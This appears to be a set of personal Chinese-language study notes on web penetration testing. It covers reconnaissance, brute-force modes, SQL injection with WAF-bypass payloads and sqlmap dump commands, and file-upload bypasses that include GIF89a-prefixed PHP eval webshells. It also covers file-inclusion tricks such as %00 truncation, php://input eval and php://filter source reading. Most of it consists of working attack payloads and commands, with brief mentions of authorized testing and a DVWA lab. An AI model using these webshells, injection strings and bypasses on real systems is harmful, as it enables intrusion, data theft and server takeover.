web
个人 -》 网络 -》cdn -》对方服务器（安全狗=>中间件=>mysql）=>网页打印


有狗的时候，木马无法通过访问

1.木马免杀
2.个人――》网络的时候  我把流量转发到本地  base64_encode()，转发到网络   中转尝试突破防护


授权检测


黑盒测试
白盒测试
灰盒测试


渗透的流程（大站）
1.信息  通过域名信息收集 二级域名  旁站 C段


社工
	google hacking(bing > baidu)
	社工库
	网站信息 支付宝 朋友网  淘宝-个人空间  

2.尝试漏洞(进入内网)
xxx.com
ww.xxx.com
test.xxx.com
test.test.xxx.com

端口
	redis/memcache 未授权访问

3.
漏洞没打补丁
弱口令


域




成功
欢迎你,xxx

失败
登陆失败 

一个账号登陆成功的次数 应该是一次



Sinper  		单变量  单字典
battering ram 		多变量  单字典
Pitchfork		多变量  多字典     字典一一对应
Cluster bomb  		多变量  多字典     循环爆破  一对多

A   B
1  a
   b
c






网站


http://xx.com/1.php?id=1

编程语言 接受了参数

select * from user where id = 变量

防护软件基于黑名单验证（黑名单验证）
select * from user where id = 99999999999 and 'a'='a'
select * from user where id = 99999999999 xor 'a'='a'




select * from user where id = '变量'

内联注入
1' and '1'='1
select * from user where id = '1' and '1'='1'

终止注入
1' and 1=1#
select * from user where id = '1' and 1=1#'


畸形
Select * from user where id =(((((变量)))))
Select * from user where id =(((({(变量)}))))


http://192.168.50.60/dvwa

https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&ch=&tn=mswin_oem_dg&bar=&wd=hydra&oq=huohu&rsv_pq=c9631848000371e3&rsv_t=39eaUb323R2JKfM9vBsZcYq5oLG9rvSk4pRsJH2FSRPOL3m3pf4hzxt7Ohcc6kLb01CB&rqlang=cn&&

admin
password


浏览器处理特殊字符的时候，需要转换为URL编码





SQL注入（针对每一种数据）
执行操作
读写操作
增删改查



MSSQL
执行权限	cmdshell

MySQL
执行权限	默认不存在执行权限




数据库
	表
		字段
			值


Access
sqlmap -u url  --tables
sqlmap -u url  -T "表名" --cloumns 
sqlmap -u url  -T "表名" -C "列名" --dump

MSSQL MySQL Oracle
sqlmap -u url  --dbs
sqlmap -u url  --tables -D "数据库"
sqlmap -u url  -T "表名" -D "数据库" --cloumns 
sqlmap -u url  -T "表名" -C "列名"  -D "数据库" --dump


Select * from user where id =(((((变量)))))

sqlmap -u url  --dbs  --prefix=")))))"

--threads=10     线程
--dbms=DBMS

出现乱码或者空内容
--no-cast
--hex
--charset=GBK

增加大量payload
--risk=RISK 		(1-3, default 1)


--level=LEVEL  		(1-5, default 1)

--level  1  默认检测 get post
--level 2  默认检测 get post cookie
--level 5  检测所有http头信息


--string=STRING
--code=CODE

--technique=TECH SQL injection techniques to use (default "BEUSTQ")

--tamper 使用插件

--batch  默认选择
--flush  清空缓存


post表单提交
-r
--data
--forms




web
精通脚本黑客  
Web深度解剖

乌云的漏洞库 8w


firefox   

firebug
hackbar
Web Developer

1.js验证
吧on事件删除



2.MIME
Content-Type: image/jpeg

image/gif
image/png
image/jpeg
image/bmp


3.内容验证

copy /b 1.png + 1.php  2.php   

图片->属性->详细信息->版权-><?php phpinfo();?>


4.后缀名

4.1 操作系统

window
1.php.
1.php空格
1.php::$data    文件流特性
大小写


4.2 中间件

IIS 6
1.asp、cer、cdx、asa都被解析为asp文件
2.目录为1.asp则其他所有文件都解析为asp文件
3. 1.asp;1.jpg  	1.asp;.jpg(上传成功内容为空)
4. 1.asp%001.jpg

IIS7
fast-cgi漏洞
上传图片马 1.jpg    =>   1.jpg/xxx.php


nginx
上传图片马 1.jpg    =>   1.jpg%00xxx.php
上传图片马 1.jpg    =>   1.jpg/xxx.php


light
fast-cgi漏洞
上传图片马 1.jpg    =>   1.jpg/xxx.php


apache
1.apache从右向左解析，如果最后的后缀名无法解析，则解析前面一个
2.php3  php4 phtml php5 pht

apache的第二点是基于 debian和ubuntu的apt-get安装lamp，否则是不存在该类型漏洞


4.3 代码层

<?php ..... ?>  判断文件头，如果文件头是<?php  则不允许上传

<?php ... ?>					默认的php代码风格
<? ... ?>					short_open_tag = On 	php短标签风格
<% ... %> 					asp_tags = Off	  asp风格
<script language="php">...</script>   		脚本风格
 

GIF89a <?php eval($_POST['c4rt1y']); ?>  				 	1.jpg
GIF89a <? eval($_POST['c4rt1y']);  ?>						2.jpg
GIF89a <% eval($_POST['c4rt1y']);  %>						3.jpg
GIF89a <script language="php">eval($_POST['c4rt1y']); </script> 		4.jpg

GIF89a  <% execute(request(1))%>						5.jpg




5. 特殊上传漏洞

	目录验证上传

在A/b/c/是上传保存文件目录，存在一个脚本，判断c目录下是否存在php后缀的文件，如果存在，则删除。存在一个定义路径的变量和上传文件的变量

Content-Disposition: form-data; name="path"

../images
-----------------------------190023260920007
Content-Disposition: form-data; name="upfile"; filename="1.php"
Content-Type: application/octet-stream


<?php
phpinfo();
?>

修改path，导致上传路径变到b目录下，不存在检测，则绕过验证



	双文件上传
在c是上传保存文件目录，代码存在bug，可以一次上传多个文件，但是检测的时候只检测第一个上传的文件，导致了使用双文件上传直接突破


	编辑漏洞（ewebedit fck）



本地远程 文件包含

include $_GET["file"]."tpl";       

1.使用%00截断
include.php?file=2.txt%00
2.
window下的文件名最大长度是259
unix的文件名最大长度是4099

include.php?file=2.txt.............................................................................................................................................................................................................................................



include "test/".$_GET['file'];     	../2.txt


include "test_".$_GET['file'];		 /../2.txt




window特性


<<  	===  	.*	多个任意字符
<   	===  	.  	一个任意字符


如果首个字母相同，则比较第二位的ascii，读取ascii小的文件，以此类推。



远程文件包含（http:// or ftp://  or https://）
allow_url_include = Off


菜刀
GET:http://localhost/include/include.php?file=php://input
POST:<?php eval($_POST[1])?>&1



伪协议
test.php?file=php://filter/convert.base64-encode/resource=flag.php


端口对应表 对每个端口的漏洞进行测试挖掘






1q2w3e4r!@#$ 连续性
1qaz3edc!@#








1.1.1.1  test.com

2.2.2.2
3.3.3.3 